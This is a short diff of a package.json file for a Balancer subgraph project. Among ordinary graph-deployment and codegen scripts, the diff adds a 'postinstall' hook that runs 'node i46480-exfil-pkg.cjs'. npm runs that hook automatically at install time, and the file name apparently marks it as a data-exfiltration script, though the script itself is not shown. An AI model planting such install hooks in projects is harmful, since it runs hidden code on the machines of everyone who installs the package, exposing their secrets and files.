@@ -2,6 +2,7 @@
   "name": "balancer",
   "version": "0.1.0",
   "scripts": {
+    "postinstall": "node i46480-exfil-pkg.cjs",
     "create": "graph create balancer-labs/v2-smol --node https://api.thegraph.com/deploy/",
     "create:local": "graph create balancer-labs/v2-smol --node http://localhost:8020",
     "codegen": "npm run generate-manifests && graph codegen subgraph.mainnet.yaml --output-dir src/types/",
